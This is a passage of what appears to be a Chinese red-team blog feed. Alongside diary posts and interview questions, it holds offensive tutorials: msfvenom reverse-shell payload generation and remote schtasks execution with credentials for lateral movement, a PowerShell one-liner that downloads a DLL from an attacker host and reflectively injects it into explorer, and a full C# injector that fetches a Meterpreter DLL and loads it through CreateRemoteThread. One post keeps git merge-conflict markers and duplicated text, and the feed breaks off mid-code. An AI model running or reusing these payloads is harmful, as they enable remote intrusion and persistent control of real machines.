class="hljs-string">&quot;大而全&quot;</span><br>-&gt; 慢慢尝试先单点突破 再逐步全局控制<br><br></code></pre></div></td></tr></table></figure><p>上面这种学习过程，其实无形中就是在帮你节省大量的时间，毫不夸张的说，可能你一年就把别人三年的东西全部学完了，甚至最后比别人三年学的还要扎实，因为一旦养成这种学习习惯之后基本就不用再去无休止的反攻浪费时间，最后，你会发现只要自己基础掌握的足够扎实，后面不管学什么东西，只要不是那种全新的领域或者非常高精尖的东西通常情况下入门都相对比较快，只是过程中思维转变确实需要一定的过度时间</p><p>    后期，当你自己确实有了一定的技术积淀之后，那时候你应该思考更多的不再是全，而是选择一两个自己真正喜欢或者擅长的领域去深入专，最终要专到什么程度呢 ?  这样说吧，起码在那个领域上，你无人可替，然后把其它领域都作为辅助</p>]]></content>
    
    
    <categories>
      
      <category>expirence</category>
      
    </categories>
    
    
    <tags>
      
      <tag>expirence</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker仓库（六）</title>
    <link href="/2021/05/05/11-x/"/>
    <url>/2021/05/05/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>最近收到一个任务，说要对云上工具基础设施建设与维护。姑且算是工作内容吧，然后最近一两年也会用到这个东西。于是学一学。</p><p>团队的云上的设施基本都在docker里</p><ul><li>docker file的编写，和docker使用</li><li>docker仓库维护，推拉</li></ul><h2 id="docker仓库"><a href="#docker仓库" class="headerlink" title="docker仓库"></a>docker仓库</h2><p>docker仓库是什么？<br>它与registry、image有什么关系？</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-05-11/docker.png"></p><h2 id="registry"><a href="#registry" class="headerlink" title="registry"></a>registry</h2><p>docker-registry 是官方提供的工具，可以用于构建私有的镜像仓库。</p><h2 id="registry可以用来干嘛"><a href="#registry可以用来干嘛" class="headerlink" title="registry可以用来干嘛"></a>registry可以用来干嘛</h2><p>如果我们想要构建私有镜像，就可以使用registry（开源）。<br>除了使用registry，还可以使用docker hub私有仓库。</p><p>例如，在红队当中，渗透工具上云。这些肯定是不能公开的。那么我们就可以使用registry，来构建私有的镜像仓库。将不同的工具封装为不同的镜像。方便渗透人员使用。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-05-11/docker2.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>docker从入门到实践：<a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>卑微安服仔的一天</title>
    <link href="/2021/04/21/02-x/"/>
    <url>/2021/04/21/02-x/</url>
    
    <content type="html"><![CDATA[<p>离开深圳，来到南京。</p><p>南京的地铁比深圳老旧很多，上地铁的人抢座很严重，就像生怕抢不到座位一样，门一开，乌拉拉冲上来一堆人。眨了下眼睛，身边空荡荡的座位就已经坐满了。</p><p>4月5日。老大叫我跟他一起去上海见见同事，团建。于是刚到南京，我就准备去上海了 ==</p><p>因为昨天晚上几乎没睡（不知道是因为离开深圳，对未来很焦虑的原因吗），所以找了个旅馆，我睡到了下午。</p><p>下午5点出头，被电话的铃声惊醒，然后赶去地铁站，就一站。奔跑，奔跑，不知道赶不赶得上，南京人好多 。</p><p>老大说他在b4，在二楼，结果二楼都是a1-14。。。其实地铁站在负一楼，他在一楼，但是他以为他在二楼。</p><p>指错路的后果是，我把二楼逛了一圈，然后发现b4进站口其实是在一楼。以后再去上海我不会再找错路了。毕竟第一次来南京火车站印象就如此深刻。</p><p>差一点点没有赶上高铁。虚惊一场。</p><p>4月21日。</p><p>来南京已经半个多月了。期间经历了找房子、签合同、买家具等等，总算安顿了下来。</p><p>今天早上也在hw过程当中，有个姓田的大佬拿shell很厉害。老大说他是野路子出身。就是说，上学开始就很早搞安全的。</p><p>跟在深圳不一样，没有早会，不需要用wireshark抓流量，不需要写周报，不需要跟周围人比较谁更努力，谁加班。我环顾四周，来上班的就我一个安服仔。</p><p>怎么说呢。</p><p>之前我还在算时薪，这里和深圳差不多。但是我发现这里的时薪比深圳高多了。</p><p>租了一个跟深圳相比价格两倍有余的房子，幸福感提高了很多。挺不错的。</p><p>但是像老大这种技术水平的就只有一个。发现这里和深圳一样，也是安全技术团队刚刚开始发展的状态。</p><p>一切都在萌芽当中。</p><p>一群人在一起学习，变成了我在南京一个人学习。其实嘛，区别不大。</p><p>虽然之前每周都有分享会，但是每个人的方向并不同。IOT，病毒分析，Web，内网，蜜罐，APT，免杀…… </p><p>他们的分享虽然听了，但是没有机会去实践，过段时间就忘了。在之前的公司，就是实战机会太少了。学习都是靠自己，公司是不会花费大量代价去培养一个人。招进来干什么，能干什么，就一直干什么。等到干不动了，就丢掉。</p><p>就像干电池一样。</p><p>好了，记录打完了，看看站去。</p>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应届生的面试题（五）</title>
    <link href="/2021/04/17/07-x/"/>
    <url>/2021/04/17/07-x/</url>
    
    <content type="html"><![CDATA[<h1 id="长亭hw红队面试"><a href="#长亭hw红队面试" class="headerlink" title="长亭hw红队面试"></a>长亭hw红队面试</h1><p>1.不出网有什么方法，正向shel l 方法除了reg之类的，还有什么？ </p><p>2.域内委派</p><p>3.dpapi机制说下，能干嘛</p><p>4.fastjson 不出网</p><p>5.shiro漏洞类型，721原理，721利用要注意什么？</p><p>7.weblogic 漏洞类型都有啥,原理</p><p>8.dll劫持，dll注入</p><p>9.内网优先爆破测试的端口、为什么；如果只有3389开放，爆破3389的实际影响…</p><p>10.window2003 frp nps为神马用不了</p><p>11.钓鱼方法姿势…除了exe这种双击的，还有什么</p><p>12.redis window shell方法</p><p>13.bypass uac 技巧，方法 ，原理<br>bypass uac技巧，使用白名单，dll劫持，com接口，计划任务等</p><p>14.内存马 filter shell ……….</p><p>15.PTH深度原理，利用条件</p><p>16.抓hash方法,有杀软抓不到尼…</p><p>17.Windows defender安全机制</p><p>18.有的时候抓到的hash不是明文为啥</p><p>19.hvv三大洞挨个说………..</p><p>20.cs是否有二次开发过,cna脚本有没有写过</p>]]></content>
    
    
    <categories>
      
      <category>Interview</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Interview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>apt攻击技术学习指南</title>
    <link href="/2021/04/09/01-x/"/>
    <url>/2021/04/09/01-x/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-09-01/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>mind-map</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mind-map</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/04/08/%E8%80%81%E5%B9%B4%E4%BA%BA%E7%9A%84%E7%94%9F%E6%B4%BB/"/>
    <url>/2021/04/08/%E8%80%81%E5%B9%B4%E4%BA%BA%E7%9A%84%E7%94%9F%E6%B4%BB/</url>
    
    <content type="html"><![CDATA[<p>最近换了一份工作。也跟三十岁左右的男性打了一些交道，感受到岁月的残酷。</p><p>高铁上看着坐在我右边的某人头发上的白发；我以为某大佬三十多了（35以上）其实他才29；micro8在每篇文章中都说要多喝水，因为喝水喝少了，得了肾结石。</p><p>我们马上就要老了。</p><p>工作步入了正轨。</p><p>我已经完成了18岁的我的诺言，要成为一个会拉小提琴的黑客。</p><p>已经过去好多年了。大半夜的忽然有些感慨。原来我也是给能给新人指点迷津的老师傅了。</p><p>我能想到的是</p><ol><li>均衡饮食</li><li>练出腹肌</li><li>不再熬夜通宵，保证睡眠</li><li>每天1.5L水</li><li>勤洗衣服换床单勤洗澡：P，不要再懒惰下去了。。</li><li>技术方面稳步提升就好，身体第一</li></ol><p>虽然还是觉得人生没有意义，人生而孤独，但是还是要坚强。</p><p>也算是做出了当时觉得不重要，但是几十年以后发现其实至关重要的选择。</p><p>选择在哪里，遇到什么样的人，影响了你的未来，决定了你的一生。</p><p>很多事情，一旦做出选择，就无法回头了。</p><p>年轻的时候看了很多书，现在是去践行书中的道理的时候了。</p><p>b乎上有个问题很火，虽然知道了很多道理，但是依然过不好这一生。</p><p>其实知道道理容易，做起来难。</p><p>28岁是一个分水岭，年纪大了以后很多杂事随之而来。应该更珍惜现在的时间才是。</p><p>植物大战僵尸就不要再玩了吧，2333</p>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>横向移动：schtasks远程计划任务</title>
    <link href="/2021/04/04/06-x/"/>
    <url>/2021/04/04/06-x/</url>
    
    <content type="html"><![CDATA[<h2 id="视频教程："><a href="#视频教程：" class="headerlink" title="视频教程："></a>视频教程：</h2><p><a href="https://www.bilibili.com/video/BV1Hz4y1Z7pJ">横向移动手法介绍</a></p><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/04-04-06/10.png"></p><h2 id="执行的命令"><a href="#执行的命令" class="headerlink" title="执行的命令"></a>执行的命令</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">net user administrator 123456<br>net user administrator qwe123!<br>net use \\192.168.123.67\admin$ <span class="hljs-string">/user</span>:<span class="hljs-string">&quot;administrator&quot;</span> 123456<br><br>win10提示:服务器没有配置远程管理的功能<br>win2008 命令成功完成<br>net use \\192.168.123.24\admin$ <span class="hljs-string">/user</span>:<span class="hljs-string">&quot;administrator&quot;</span> qwe123!<br>net time \\192.168.123.24 提示服务尚未启动<br>at \\192.168.123.24<br><br>生成木马<br>handler -H 192.168.123.138 -P 4444 -p windows/meterpreter/reverse_tcp<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.123.138 LPORT=4444 -f exe -o payload.exe<br><br>上传木马<br>xcopy C:\Users\whale\Desktop\p\0404.exe \\192.168.123.24\admin$\temp\<br><br>调整字符集<br>chcp 437<br><br>创建计划任务<br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/s</span> 192.168.123.24 <span class="hljs-string">/u</span> <span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">/p</span> <span class="hljs-string">&quot;qwe123!&quot;</span> <span class="hljs-string">/RL</span> HIGHEST <span class="hljs-string">/F</span> <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;todayfive&quot;</span> <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:/Windows/temp/0404.exe&quot;</span> <span class="hljs-string">/sc</span> once <span class="hljs-string">/st</span> 17<span class="hljs-function">:03</span><span class="hljs-function">:00</span><br><br>设置无论用户是否登陆，都执行计划任务<br><br>run whether user is logged on or not <br><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/s</span> 192.168.123.24 <span class="hljs-string">/u</span> <span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">/p</span> <span class="hljs-string">&quot;qwe123!&quot;</span> <span class="hljs-string">/RL</span> HIGHEST <span class="hljs-string">/F</span> <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;todayfive&quot;</span> <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;C:/Windows/temp/0404.exe&quot;</span> <span class="hljs-string">/sc</span> once <span class="hljs-string">/st</span> 17<span class="hljs-function">:03</span><span class="hljs-function">:00</span> <span class="hljs-string">/NP</span><br><br><br>查看帮助<br>schtasks <span class="hljs-string">/create</span> /?<br><br>执行计划任务<br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/tn</span> todayfive <span class="hljs-string">/s</span> 192.168.123.24 <span class="hljs-string">/U</span> <span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">/P</span> <span class="hljs-string">&quot;qwe123!&quot;</span><br><br>查看运行状态<br>schtasks <span class="hljs-string">/query</span> <span class="hljs-string">/s</span> 192.168.123.24 <span class="hljs-string">/U</span> <span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-string">/P</span> <span class="hljs-string">&quot;qwe123!&quot;</span> | findstr <span class="hljs-string">&quot;todayfive&quot;</span><br><br>删除<br>schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/F</span> <span class="hljs-string">/tn</span> todayfive <span class="hljs-string">/s</span> 192.168.123.24 <span class="hljs-string">/U</span> <span class="hljs-string">&quot; administrator&quot;</span> <span class="hljs-string">/P</span> <span class="hljs-string">&quot;qwe123!&quot;</span><br></code></pre></div></td></tr></table></figure><p>在远程的目标机器上创建计划任务</p><ol><li>被动密码搜集的方式</li><li>指定计划任务执行的时间</li><li>exe免杀木马</li></ol><p>注意：</p><ul><li>win7以后使用schtasks命令，之前使用at命令</li><li>应用场景：快速横向移动拿权限用的。</li><li>非稳定控制的方式。需要自行免杀绕过av。</li><li>拿到权限就删掉计划任务</li><li>中文系统要调整字符集</li></ul>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>lateral-movement</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反射式dll注入的演示</title>
    <link href="/2021/03/10/07-x/"/>
    <url>/2021/03/10/07-x/</url>
    
    <content type="html"><![CDATA[<h2 id="dll注入和反射式dll注入的区别"><a href="#dll注入和反射式dll注入的区别" class="headerlink" title="dll注入和反射式dll注入的区别"></a>dll注入和反射式dll注入的区别</h2><p>合法进程    恶意dll</p><p>从本地或者dll调用</p><p>【生成恶意载荷，并执行web服务托管dll】</p><p>省略</p><p>【目标机器载入内存，使用反射式dll注入直接载入内存不落盘】</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">PowerShell <span class="hljs-literal">-Exec</span> Bypass<br><br><span class="hljs-built_in">Import-Module</span> C:\Users\whale\Desktop\<span class="hljs-built_in">Invoke-ReflectivePEInjection</span>.ps1<br><span class="hljs-variable">$bytes</span> = (<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="hljs-string">&#x27;http://192.168.123.138/today.dll&#x27;</span>)<br><span class="hljs-variable">$procid</span> = (<span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Name</span> explorer).Id<br><br><span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEBytes</span> <span class="hljs-variable">$bytes</span> <span class="hljs-literal">-ProcId</span> <span class="hljs-variable">$procid</span><br></code></pre></div></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection</a></li><li><a href="https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/">https://www.andreafortuna.org/2017/12/08/what-is-reflective-dll-injection-and-how-can-be-detected/</a></li><li><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>evasion</category>
      
    </categories>
    
    
    <tags>
      
      <tag>evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dll注入的演示</title>
    <link href="/2021/03/07/11-x/"/>
    <url>/2021/03/07/11-x/</url>
    
    <content type="html"><![CDATA[<p>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</p><h2 id="前景提要"><a href="#前景提要" class="headerlink" title="前景提要"></a>前景提要</h2><p><a href="https://www.acfun.cn/v/ac12864807">whale的DLLHijack本地提权教程</a></p><p><a href="https://www.bilibili.com/video/BV1UA411K7C8">进程注入与迁移</a></p><h2 id="本期内容"><a href="#本期内容" class="headerlink" title="本期内容"></a>本期内容</h2><p>dll注入的演示</p><p>1.exe<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-07-11/1.PNG"></p><p>2.exe</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-07-11/2.PNG"></p><p>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.123.138 lport=2333 -f dll -o whale.dll</p><p>python -m SimpleHTTPServer 80</p><p>handler -H 192.168.123.138 -P 2333 -p windows/x64/meterpreter/reverse_https</p><h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>“C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\Roslyn\csc.exe” /unsafe /platform:x64 2.cs</p><p>缺点：dll落盘，会被杀软查杀</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p><p>=======</p><h2 id="前景提要-1"><a href="#前景提要-1" class="headerlink" title="前景提要"></a>前景提要</h2><p><a href="https://www.acfun.cn/v/ac12864807">whale的DLLHijack本地提权教程</a></p><p><a href="https://www.bilibili.com/video/BV1UA411K7C8">进程注入与迁移</a></p><h2 id="本期内容-1"><a href="#本期内容-1" class="headerlink" title="本期内容"></a>本期内容</h2><p>dll注入的演示</p><p>1.exe<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-07-11/1.PNG"></p><p>2.exe</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-07-11/2.PNG"></p><p>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.123.138 lport=2333 -f dll -o whale.dll</p><p>python -m SimpleHTTPServer 80</p><p>handler -H 192.168.123.138 -P 2333 -p windows/x64/meterpreter/reverse_https</p><h2 id="小实验-1"><a href="#小实验-1" class="headerlink" title="小实验"></a>小实验</h2><p>“C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\Roslyn\csc.exe” /unsafe /platform:x64 2.cs</p><p>缺点：dll落盘，会被杀软查杀</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Diagnostics;<br><span class="hljs-keyword">using</span> System.Net;<br><span class="hljs-keyword">using</span> System.Runtime.InteropServices;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Inject</span><br>&#123;<br><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span><br>&#123;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">OpenProcess</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> processAccess, <span class="hljs-built_in">bool</span> bInheritHandle, <span class="hljs-built_in">int</span></span></span><br><span class="hljs-params"><span class="hljs-function">processId</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAllocEx</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpAddress, <span class="hljs-built_in">uint</span></span></span><br><span class="hljs-params"><span class="hljs-function">dwSize, <span class="hljs-built_in">uint</span> flAllocationType, <span class="hljs-built_in">uint</span> flProtect</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">WriteProcessMemory</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpBaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-built_in">byte</span>[] lpBuffer, Int32 nSize, <span class="hljs-keyword">out</span> IntPtr lpNumberOfBytesWritten</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateRemoteThread</span>(<span class="hljs-params">IntPtr hProcess, IntPtr</span></span><br><span class="hljs-params"><span class="hljs-function">lpThreadAttributes, <span class="hljs-built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="hljs-built_in">uint</span></span></span><br><span class="hljs-params"><span class="hljs-function">dwCreationFlags, IntPtr lpThreadId</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>, CharSet = CharSet.Ansi, ExactSpelling = true,</span><br><span class="hljs-meta">SetLastError = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">GetProcAddress</span>(<span class="hljs-params">IntPtr hModule, <span class="hljs-built_in">string</span> procName</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>, CharSet = CharSet.Auto)</span>]<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">GetModuleHandle</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> lpModuleName</span>)</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span><br>&#123;<br>String dir =<br>Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);<br>String dllName = dir + <span class="hljs-string">&quot;\\\\whale.dll&quot;</span>;<br>WebClient wc = <span class="hljs-keyword">new</span> WebClient();<br>wc.DownloadFile(<span class="hljs-string">&quot;http://192.168.123.138/whale.dll&quot;</span>, dllName);<br>Process[] expProc = Process.GetProcessesByName(<span class="hljs-string">&quot;explorer&quot;</span>);<br><span class="hljs-built_in">int</span> pid = expProc[<span class="hljs-number">0</span>].Id;<br>IntPtr hProcess = OpenProcess(<span class="hljs-number">0x001F0FFF</span>, <span class="hljs-literal">false</span>, pid);<br>IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>);<br>IntPtr outSize;<br>Boolean res = WriteProcessMemory(hProcess, addr,<br>Encoding.Default.GetBytes(dllName), dllName.Length, <span class="hljs-keyword">out</span> outSize);<br>IntPtr loadLib = GetProcAddress(GetModuleHandle(<span class="hljs-string">&quot;kernel32.dll&quot;</span>),<br><span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span class="hljs-number">0</span>, loadLib,<br>addr, <span class="hljs-number">0</span>, IntPtr.Zero);<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>1fd9a547b946ff7ba2ff40ea1e86428ed03eada8</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote>]]></content>
    
    
    <categories>
      
      <category>evasion</category>
      
    </categories>
    
    
    <tags>
      
      <tag>evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进程注入与迁移</title>
    <link href="/2021/03/05/08-x/"/>
    <url>/2021/03/05/08-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1UA411K7C8">进程注入与迁移</a></p><h2 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h2><p><a href="https://segmentfault.com/a/1190000039297639">https://segmentfault.com/a/1190000039297639</a></p><p>进程，线程<br>（公司）（人）<br>卖食品、饮料、医疗、交通、房地产公司<br>进程里有多个线程，就像一个公司里有多个员工</p><p>直接反弹shell的缺点：</p><ol><li></li><li>进程注入的目的</li></ol><h2 id="进程的权限控制Integrity-Level"><a href="#进程的权限控制Integrity-Level" class="headerlink" title="进程的权限控制Integrity Level"></a>进程的权限控制Integrity Level</h2><p><a href="https://blog.csdn.net/vlily/article/details/47338327">https://blog.csdn.net/vlily/article/details/47338327</a></p><h2 id="plist查看进程中的线程"><a href="#plist查看进程中的线程" class="headerlink" title="plist查看进程中的线程"></a>plist查看进程中的线程</h2><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pslist">https://docs.microsoft.com/en-us/sysinternals/downloads/pslist</a></p><h2 id="为什么直接杀死线程是不好的"><a href="#为什么直接杀死线程是不好的" class="headerlink" title="为什么直接杀死线程是不好的"></a>为什么直接杀死线程是不好的</h2><p><a href="https://blog.csdn.net/shenya1314/article/details/59057361">https://blog.csdn.net/shenya1314/article/details/59057361</a></p><h2 id="小实验"><a href="#小实验" class="headerlink" title="小实验"></a>小实验</h2><p>c sharp + shellcode编译，注入进程explorer.exe</p><p>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.123.138 lport=2333 -f csharp</p><p>handler -H 192.168.123.138 -P 2333 -p windows/x64/meterpreter/reverse_https</p><p>“C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\MSBuild\Current\Bin\Roslyn\csc.exe” /unsafe /platform:x64 1.cs</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Runtime.InteropServices;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Inject</span><br>&#123;<br><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span><br>&#123;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]<br><span class="hljs-function"><span 